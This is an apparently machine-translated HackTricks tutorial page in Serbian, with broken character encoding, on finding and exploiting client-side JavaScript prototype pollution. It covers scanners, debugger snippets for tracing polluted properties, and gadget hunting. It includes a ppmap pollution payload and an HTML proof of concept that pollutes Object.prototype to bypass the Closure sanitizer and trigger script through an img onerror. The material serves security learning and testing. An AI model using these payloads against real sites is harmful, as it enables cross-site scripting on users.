# Klijentska Strana ZagaÄ‘enja Prototipa

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## OtkriÄ‡e koriÅ¡Ä‡enjem automatskih alata

Alati [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **i** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) mogu se koristiti za **pronalazak ranjivosti na zagaÄ‘enje prototipa**.

Pored toga, moÅ¾ete koristiti i **proÅ¡irenje za pretraÅ¾ivaÄ** [**PPScan**](https://github.com/msrkp/PPScan) da **automatski** **skenirate** **stranice** koje **pristupate** za ranjivosti na zagaÄ‘enje prototipa.

### Debagovanje gde se svojstvo koristi <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### PronalaÅ¾enje uzroka zagaÄ‘enja prototipa <a href="#id-5530" id="id-5530"></a>

Kada je ranjivost zagaÄ‘enja prototipa identifikovana pomoÄ‡u nekog od alata, i ako kod nije previÅ¡e sloÅ¾en, moÅ¾ete pronaÄ‡i ranjivost pretraÅ¾ujuÄ‡i kljuÄne reÄi kao Å¡to su `location.hash`, `decodeURIComponent`, ili `location.search` u Chrome Developer Tools. Ovaj pristup vam omoguÄ‡ava da precizno odredite ranjivi deo JavaScript koda.

Za veÄ‡e i sloÅ¾enije kodne baze, jednostavna metoda za otkrivanje ranjivog koda ukljuÄuje sledeÄ‡e korake:

1. Koristite alat za identifikaciju ranjivosti i dobijanje payload-a dizajniranog da postavi svojstvo u konstruktoru. Primer koji pruÅ¾a ppmap moÅ¾e izgledati ovako: `constructor[prototype][ppmap]=reserved`.
2. Postavite breakpoint na prvu liniju JavaScript koda koja Ä‡e se izvrÅ¡iti na stranici. OsveÅ¾ite stranicu sa payload-om, pauzirajuÄ‡i izvrÅ¡enje na ovom breakpoint-u.
3. Dok je izvrÅ¡enje JavaScript-a pauzirano, izvrÅ¡ite sledeÄ‡i skript u JS konzoli. Ovaj skript Ä‡e signalizirati kada je svojstvo 'ppmap' kreirano, pomaÅ¾uÄ‡i u lociranju njegovog porekla:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Vratite se na karticu **Sources** i izaberite â€œResume script executionâ€. JavaScript Ä‡e nastaviti sa izvrÅ¡avanjem, a 'ppmap' svojstvo Ä‡e biti zagaÄ‘eno kao Å¡to se oÄekuje. KoriÅ¡Ä‡enje datog snippeta olakÅ¡ava identifikaciju taÄne lokacije gde je 'ppmap' svojstvo zagaÄ‘eno. IstraÅ¾ivanjem **Call Stack**, mogu se posmatrati razliÄiti stekovi gde je doÅ¡lo do zagaÄ‘enja.

Kada odluÄujete koji stek da istraÅ¾ite, Äesto je korisno ciljati stekove povezane sa JavaScript biblioteÄkim datotekama, jer se zagaÄ‘enje prototipa Äesto deÅ¡ava unutar ovih biblioteka. Identifikujte relevantan stek ispitivanjem njegove povezanosti sa biblioteÄkim datotekama (vidljivo sa desne strane, sliÄno slici koja je data kao vodiÄ). U scenarijima sa viÅ¡e stekova, kao Å¡to su oni na linijama 4 i 6, logiÄan izbor je stek na liniji 4, jer predstavlja poÄetno zagaÄ‘enje i tako uzrok ranjivosti. Klikom na stek biÄ‡ete preusmereni na ranjivi kod.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## PronalaÅ¾enje Script Gadgets

Gadget je **kod koji Ä‡e biti zloupotrebljen kada se otkrije PP ranjivost**.

Ako je aplikacija jednostavna, moÅ¾emo **pretraÅ¾ivati** za **kljuÄnim reÄima** kao Å¡to su **`srcdoc/innerHTML/iframe/createElement`** i pregledati izvorni kod i proveriti da li **dovodi do izvrÅ¡avanja javascripta**. Ponekad, pomenute tehnike moÅ¾da uopÅ¡te ne pronaÄ‘u gadgete. U tom sluÄaju, Äista revizija izvornog koda otkriva neke lepe gadgete kao Å¡to je donji primer.

### Primer pronalaÅ¾enja PP gadgeta u kodu Mithil biblioteke

Proverite ovaj writeup: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Rekompilacija payload-a za ranjive biblioteke

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass HTML sanitizera putem PP

[**Ova istraÅ¾ivanja**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) prikazuje PP gadgete koji se koriste za **obiÄ‡i sanitizacije** koje pruÅ¾aju neke biblioteke HTML sanitizera:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Reference

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
